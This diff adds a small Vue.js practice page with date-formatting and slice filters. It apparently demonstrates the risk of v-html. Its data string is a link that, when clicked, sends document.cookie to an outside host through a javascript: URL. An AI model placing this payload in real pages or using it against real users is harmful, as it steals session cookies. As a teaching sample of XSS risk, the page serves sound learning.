@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>html</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.4/dayjs.min.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div v-html="str"></div>
+    </div>
+
+
+    <script type="text/javascript">
+        Vue.filter('getTime', function(value, str='YYYY年MM月DD日 HH:mm:ss'){
+            return dayjs(value).format(str)
+        })
+        Vue.filter('slice', function(str, st=0, ed=0){
+            return str.slice(st, ed)
+        })
+        const vm = new Vue({
+            el:'#root',
+            data:{
+                str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击获取cookie</a>'
+            },
+            methods:{
+                
+            },
+
+        })
+    </script>
+</body>
+</html>
